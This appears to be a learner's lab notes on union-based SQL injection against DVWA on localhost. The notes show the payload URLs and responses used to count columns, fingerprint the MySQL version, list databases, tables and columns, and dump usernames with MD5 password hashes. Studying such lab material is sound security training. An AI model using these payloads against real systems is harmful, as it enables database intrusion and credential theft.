 http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1'+true%23&Submit=Submit --> return true
 
http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1'+false%23&Submit=Submit --> return false
 
http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1'+order+by+2%23&Submit=Submit
 
http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1'+order+by+3%23&Submit=Submit   -> return error
 
hence two columns select statement
 
http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1'+union+select+1,1%23&Submit=Submit
 
http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1'+union+select+'canary','bob'%23&Submit=Submit  -> return data
 
 
http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1'+union+select+@@version,'bob'%23&Submit=Submit 
        <pre>ID: 1' union select @@version,'bob'#<br />First name: admin<br />Surname: admin</pre><pre>ID: 1' union select @@version,'bob'#<br />First name: 5.7.28-0ubuntu0.19.04.2<br />Surname: bob</pre>
 
 
now let's extract data:
 
to show current database:
http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1'+union+select+database(),1+from+information_schema.schemata%23&Submit=Submit
 
<pre>ID: 1' union select database(),1 from information_schema.schemata#<br />First name: admin<br />Surname: admin</pre><pre>ID: 1' union select database(),1 from information_schema.schemata#<br />First name: dvwa<br />Surname: 1</pre>
 
to show current database:
http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1'+union+select+schema_name,1+from+information_schema.schemata%23&Submit=Submit
 
<pre>ID: 1' union select schema_name,1 from information_schema.schemata#<br />First name: admin<br />Surname: admin</pre><pre>ID: 1' union select schema_name,1 from information_schema.schemata#<br />First name: information_schema<br />Surname: 1</pre><pre>ID: 1' union select schema_name,1 from information_schema.schemata#<br />First name: cmsms<br />Surname: 1</pre><pre>ID: 1' union select schema_name,1 from information_schema.schemata#<br />First name: dvwa<br />Surname: 1</pre><pre>ID: 1' union select schema_name,1 from information_schema.schemata#<br />First name: mysql<br />Surname: 1</pre><pre>ID: 1' union select schema_name,1 from information_schema.schemata#<br />First name: performance_schema<br />Surname: 1</pre><pre>ID: 1' union select schema_name,1 from information_schema.schemata#<br />First name: sys<br />Surname: 1</pre>
 
to show all tables in database dvwa:
1' union select null,table_name from information_schema.tables where table_schema='dvwa' #
http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1%27+union+select+null,table_name+from+information_schema.tables+where+table_schema=%27dvwa%27+%23&Submit=Submit
 
ID: 1' union select null,table_name from information_schema.tables where table_schema='dvwa' #
First name: 
Surname: guestbook
 
ID: 1' union select null,table_name from information_schema.tables where table_schema='dvwa' #
First name: 
Surname: users
 
show all columns in database table name: users
column_name
table_name = 'users'
table_schema = 'dvwa'
 
1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
ID: 1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
First name: admin
Surname: admin
 
ID: 1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
First name: 
Surname: user_id
 
ID: 1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
First name: 
Surname: first_name
 
ID: 1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
First name: 
Surname: last_name
 
ID: 1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
First name: 
Surname: user
 
ID: 1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
First name: 
Surname: password
 
ID: 1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
First name: 
Surname: avatar
 
ID: 1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
First name: 
Surname: last_login
 
ID: 1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
First name: 
Surname: failed_login
 
 
to extract username,cred:
ID: 1' union select user,password from dvwa.users#
ID: 1' union select user,password from dvwa.users#
First name: admin
Surname: admin
 
ID: 1' union select user,password from dvwa.users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 
ID: 1' union select user,password from dvwa.users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
 
ID: 1' union select user,password from dvwa.users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
 
ID: 1' union select user,password from dvwa.users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
 
ID: 1' union select user,password from dvwa.users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 
 
 
 
 
 
 
 
 
 
 
 
 

